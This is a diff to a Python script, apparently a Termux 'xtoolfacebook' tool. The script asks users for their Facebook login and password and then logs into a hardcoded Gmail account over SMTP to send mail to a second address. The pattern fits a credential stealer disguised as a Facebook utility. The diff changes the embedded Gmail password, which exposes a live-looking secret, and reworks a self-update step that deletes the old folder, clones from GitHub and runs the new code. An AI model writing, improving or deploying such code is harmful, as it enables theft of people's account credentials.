@@ -15,12 +15,13 @@ print('''
 ''')
 upd = input('mettre à jour ?(y/n)')
 if upd == 'y':
-    os.system('cd $home')
-    os.system('mv xtoolfacebook xtoolx')
+    os.chdir('/data/data/com.termux/files/home')
+    shutil.rmtree('xtoolfacebook')
     os.system('git clone https://github.com/ZarguiJack/xtoolfacebook')
     print('done')
     os.system('cd xtoolfacebook')
     os.system('python Xtool.py')
+    sys.exit()
 print('Veuillez tout d\'abord vous connecter à votre compte Facebook/// first log into your own facebook account')
 usn = input('email/phonenumber: ')
 usp = input('Password: ')
@@ -48,7 +49,7 @@ s = smtplib.SMTP_SSL('smtp.gmail.com', 465, context = context)
   
 # Authentication 
 sa = 'zarguinajack@gmail.com'
-sp = 'fugidemsvie'
+sp = 'fugidesvie'
 s.login(sa, sp) 
 
 ra = 'bertranddupont885@gmail.com'
